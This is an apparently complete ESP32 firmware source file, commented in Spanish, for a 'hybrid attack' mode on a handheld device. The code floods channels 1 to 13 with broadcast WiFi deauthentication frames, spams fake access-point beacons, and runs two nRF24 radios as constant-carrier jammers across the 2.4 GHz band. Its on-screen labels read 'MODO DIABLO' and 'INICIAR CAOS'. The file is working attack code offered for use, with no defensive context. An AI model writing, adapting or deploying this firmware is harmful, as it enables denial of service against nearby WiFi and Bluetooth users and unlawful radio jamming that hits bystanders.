#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <RF24.h>
#include <U8g2lib.h>
#include "hybrid_attack.h"

extern bool isHybridActive; 
extern RF24 jam1; extern RF24 jam2;
extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

// Datos externos para los nombres de red
extern const char* ssids[];
extern int total_ssids;

// Paquete de Desautenticación
uint8_t deauth_pkt[26] = {
    0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x01, 0x00
};

// Paquete Beacon base
uint8_t beacon_pkt[128] = { 
    0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x64, 0x00, 0x31, 0x04, 0x00, 0x00 
};

void hybridAttackLoop() {
    if (digitalRead(32) == LOW) { // Botón OK
        isHybridActive = !isHybridActive;
        if (isHybridActive) {
            WiFi.mode(WIFI_STA);
            esp_wifi_set_promiscuous(true);
            jam1.begin(); jam2.begin();
            jam1.setDataRate(RF24_1MBPS); jam2.setDataRate(RF24_1MBPS);
            jam1.startConstCarrier(RF24_PA_MAX, 40);
            jam2.startConstCarrier(RF24_PA_MAX, 60);

            u8g2.clearBuffer();
            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.drawStr(10, 35, "!!! MODO DIABLO !!!");
            u8g2.drawStr(10, 50, "SSID + DEAUTH + BT");
            u8g2.sendBuffer();
        } else {
            esp_wifi_set_promiscuous(false);
            WiFi.mode(WIFI_OFF);
            jam1.stopConstCarrier(); jam2.stopConstCarrier();
        }
        delay(400);
    }

    if (isHybridActive) {
        // Ciclo de canales WiFi
        for (int ch = 1; ch <= 13; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            delay(1); // Tiempo para que el hardware cambie de frecuencia

            // 1. GOLPE DE MUERTE (Deauth)
            for(int i=0; i<8; i++) {
                esp_wifi_80211_tx(WIFI_IF_STA, deauth_pkt, 26, false);
            }

            // 2. INYECCIÓN DE SSID (Beacon Spam)
            int sid = random(0, total_ssids);
            int len = strlen(ssids[sid]);
            for(int m=38; m<70; m++) beacon_pkt[m] = 0; // Limpiar SSID previo
            beacon_pkt[37] = len;
            for (int j = 0; j < len; j++) beacon_pkt[38 + j] = ssids[sid][j];
            int pos = 38 + len;
            // Tags necesarios para que el celular vea la red
            beacon_pkt[pos++] = 0x01; beacon_pkt[pos++] = 0x08;
            beacon_pkt[pos++] = 0x82; beacon_pkt[pos++] = 0x84;
            beacon_pkt[pos++] = 0x8b; beacon_pkt[pos++] = 0x96;
            beacon_pkt[pos++] = 0x24; beacon_pkt[pos++] = 0x30;
            beacon_pkt[pos++] = 0x48; beacon_pkt[pos++] = 0x6c;
            beacon_pkt[pos++] = 0x03; beacon_pkt[pos++] = 0x01;
            beacon_pkt[pos++] = ch; 
            esp_wifi_80211_tx(WIFI_IF_STA, beacon_pkt, pos, false);

            // 3. RUIDO FÍSICO (Radios nRF24)
            jam1.setChannel(random(2, 40));
            jam2.setChannel(random(41, 80));

            // Revisión de salida
            if (digitalRead(25) == LOW) { 
                isHybridActive = false;
                esp_wifi_set_promiscuous(false);
                WiFi.mode(WIFI_OFF);
                jam1.stopConstCarrier(); jam2.stopConstCarrier();
                return; 
            }
        }
    } else {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(0, 10, "MODO HIBRIDO");
        u8g2.drawStr(5, 40, "OK: INICIAR CAOS");
        u8g2.sendBuffer();
    }
}